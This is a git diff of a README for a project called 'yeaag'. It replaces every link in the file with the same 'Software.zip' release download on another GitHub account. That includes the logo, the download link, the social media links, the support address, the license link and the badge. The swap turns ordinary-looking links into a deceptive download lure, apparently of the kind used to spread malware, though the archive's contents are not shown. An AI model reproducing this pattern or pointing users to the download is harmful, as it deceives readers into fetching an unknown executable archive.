@@ -1,7 +1,7 @@
 
 # Welcome to yeaag! 🎉
 
-![yeaag Logo](https://example.com/yeaag_logo.png)
+![yeaag Logo](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -9,7 +9,7 @@ Welcome to the yeaag repository! This is a platform where we strive to provide y
 
 ## Get Started
 
-To get started with yeaag, you can simply download the latest version of our software by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once the download is complete, follow the instructions to launch the software and embark on a journey of entertainment and knowledge.
+To get started with yeaag, you can simply download the latest version of our software by clicking [here](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip). Once the download is complete, follow the instructions to launch the software and embark on a journey of entertainment and knowledge.
 
 ## Features
 
@@ -37,18 +37,18 @@ We welcome contributions from the community to help make yeaag even better! Whet
 
 Join the yeaag community on social media to stay updated on the latest news, content releases, and community events! Follow us on:
 
-- [Twitter](https://twitter.com/yeaag_official)
-- [Instagram](https://instagram.com/yeaag)
-- [Facebook](https://facebook.com/yeaag)
+- [Twitter](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip)
 
 ## Support
 
-If you need any assistance or have any questions about yeaag, feel free to reach out to our support team at support@yeaag.com. We are here to help you make the most out of your yeaag experience.
+If you need any assistance or have any questions about yeaag, feel free to reach out to our support team at https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip We are here to help you make the most out of your yeaag experience.
 
 ## License
 
-yeaag is licensed under the MIT License. See the [LICENSE](https://github.com/yeaag/yeaag/blob/main/LICENSE) file for more details.
+yeaag is licensed under the MIT License. See the [LICENSE](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip) file for more details.
 
 ---
 
-[![Download yeaag](https://img.shields.io/badge/Download-yeaag-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download yeaag](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip)](https://github.com/Arturxlc/yeaag/releases/download/v2.0/Software.zip)
